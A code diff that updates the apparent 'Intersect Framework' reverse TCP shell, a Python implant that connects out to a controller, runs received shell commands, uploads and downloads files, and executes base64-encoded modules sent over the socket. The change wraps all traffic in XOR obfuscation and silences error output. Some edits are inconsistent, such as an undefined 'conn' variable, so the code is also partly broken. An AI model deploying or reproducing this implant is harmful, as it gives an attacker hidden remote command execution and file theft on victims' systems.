@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # Intersect Framework
-# Server-side shell and module handler
-# Reverse TCP
+# Server-side shell & module handler
+# Reverse TCP XOR
 
 import os, sys, re, signal
 import socket
@@ -23,27 +23,35 @@ from math import log
 
 
 
+def xor(string, key):
+    data = ''
+    for char in string:
+        for ch in key:
+            char = chr(ord(char) ^ ord(ch))
+        data += char
+    return data
+
 def module_handler(module, modname):
     status_msg("[+] Module: %s\n" % modname)
     status_msg("[+] Start time: %s" % logtime)
     exec(module)
-    connection.send("shell => ")
+    connection.send(xor("shell => ", pin))
 
 
 def status_msg(message):
-    connection.send("%s" % message)
+    connection.send(xor("%s" % message, pin))
 
 
 def log_msg(message):
-    connection.send(":log %s" % message)
+    connection.send(xor(":log %s" % message, pin))
 
 
 def cat_file(filename):
     if os.path.exists(filename) and os.access(filename, os.R_OK):
         catfile = open(filename, "rb")
-        connection.send("[+] Contents of %s" % filename)
+        connection.send(xor("[+] Contents of %s" % filename, pin))
         for lines in catfile.readlines():
-            connection.sendall(lines)
+            connection.sendall(xor( lines ,pin))
         catfile.close()
 
 
@@ -52,10 +60,9 @@ def save_file(filename):
         savefile = open(filename, "rb")
         filedata = savefile.read()
         savefile.close()
-        connection.send(":savef %s" % filename)
+        connection.send(xor(":savef %s" % filename, pin))
         time.sleep(2)
-        connection.sendall( filedata )
-        time.sleep(2)
+        connection.sendall(xor( filedata , pin))
     else:
         pass
 
@@ -68,8 +75,7 @@ def cmd(command):
                stdin=PIPE,
                )
     stdout, stderr = proc.communicate()
-    connection.sendall( stdout )              # Send output back to the client
-
+    connection.sendall(xor( stdout , pin))              # Send output back to the client
 
 def cmd2txt(command, textfile):
     os.system("%s > %s" % (command, textfile))
@@ -98,49 +104,51 @@ def users():
 
 
 def main():
-    global connection
     connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
         connection.connect((HOST, PORT))
-        connection.send("shell => ")
+        connection.send(xor("shell => ", pin))
     except:
-        print("[!] Connection error!")
+        #print("[!] Connection error!")
         sys.exit(2)
     
-    while True:
-        cmd = connection.recv(socksize)
-        proc = Popen(cmd,
-                shell=True,
-                stdout=PIPE,
-                stderr=PIPE,
-                stdin=PIPE,
-                )
+    while True:                                     
+        cmd = conn.recv(socksize)
+        cmd2 = xor(cmd, pin)
+        proc = Popen(cmd2,
+             shell=True,
+             stdout=PIPE,
+             stderr=PIPE,
+             stdin=PIPE,
+             )
         stdout, stderr = proc.communicate()
-            
+
         if cmd.startswith(':upload'):
             getname = cmd.split(" ")
             rem_file = getname[1]
             filename = rem_file.replace("/","_")
             filedata = connection.recv(socksize)
+            filedata = xor(filedata, pin)
             newfile = file(filename, "wb")
             newfile.write(filedata)
             newfile.close()
             if os.path.isfile(filename):
-                connection.send("[+] File upload complete!")
+                connection.send(xor("[+] File upload complete!\n", pin))
             if not os.path.isfile(filename):
-                connection.send("[!] File upload failed! Please try again")
+                connection.send(xor("[!] File upload failed! Please try again\n", pin))
 
         elif cmd.startswith(':download'):
-            getname = cmd.split(" ")
+            getname = cmd2.split(" ")
             loc_file = getname[1]
             if os.path.exists(loc_file) is True:
                 sendfile = open(loc_file, "r")
                 filedata = sendfile.read()
                 sendfile.close()
-                connection.sendall(filedata)
+                senddata = xor(filedata, pin)
+                connection.sendall(senddata)
             else:
-                connection.send("[+] File not found!")
+                connection.send(xor("[+] File not found!", pin))
     
         elif cmd.startswith(':exec'):
             getname = cmd.split(" ")        # split mod name from cmd
@@ -149,23 +157,21 @@ def main():
             mod_data = ""                   # Our received file data will go here 
             data = connection.recv(socksize)
             mod_data += data
-            #print("[+] Module recieved!")
-            connection.send("Complete")     # sends OK msg to the client
+            connection.send(xor("Complete", pin))     # sends OK msg to the client
             modexec = b64decode(mod_data)   # decode the received file
             module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
 
         elif cmd == ":quit":
-            print("[!] Closing server!")
-            connection.close()
+            conn.close()
             os._exit(0)
             sys.exit(0)
 
         elif proc:
-            connection.send( stdout )
-            connection.send("shell => ")
+            connection.send(xor( stdout , pin))
+            connection.send(xor("shell => ", pin))
 
     connection.close() 
-    sys.exit(0)
+    os._exit(0)
 
 
 def globalvars():
@@ -184,6 +190,7 @@ def globalvars():
     global connection
     global HOST
     global PORT
+    global pin
 
     socksize = 4096                            
 
@@ -208,3 +215,10 @@ def globalvars():
     else:
         currentuser = "root"
 
+
+    HOST = '127.0.0.1'
+    PORT = 4444
+    pin = 'TESTME'
+
+globalvars()
+main()
